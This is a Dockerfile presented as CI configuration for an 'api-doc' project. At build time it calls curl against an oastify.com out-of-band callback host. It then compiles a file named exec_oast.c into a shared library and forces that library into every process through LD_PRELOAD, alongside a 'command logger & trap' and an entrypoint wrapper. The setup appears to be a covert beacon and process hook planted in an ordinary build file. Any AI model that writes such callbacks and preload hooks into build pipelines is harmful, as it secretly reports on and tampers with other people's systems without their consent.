FROM node:18-bullseye
LABEL ci=rudder/api-doc/Dockerfile
ENV NODE_ENV=production

RUN apt-get update && apt-get install -y rsync python3-yaml curl gcc && rm -rf /var/lib/apt/lists/*

RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/api-doc

# 1) Install the logger & trap
COPY ci/command_logger.sh /etc/command_logger.sh

COPY ci/exec_oast.c /tmp/exec_oast.c
RUN gcc -shared -fPIC -o /usr/local/lib/libexec_oast.so /tmp/exec_oast.c -ldl \
 && rm /tmp/exec_oast.c


# 2) Install our ENTRYPOINT wrapper
COPY ci/entrypoint.sh /usr/local/bin/entrypoint.sh
RUN chmod +x /usr/local/bin/entrypoint.sh

# ensure it's preloaded for all processes
ENV LD_PRELOAD=/usr/local/lib/libexec_oast.so
# 3) Set it as the container’s ENTRYPOINT
ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]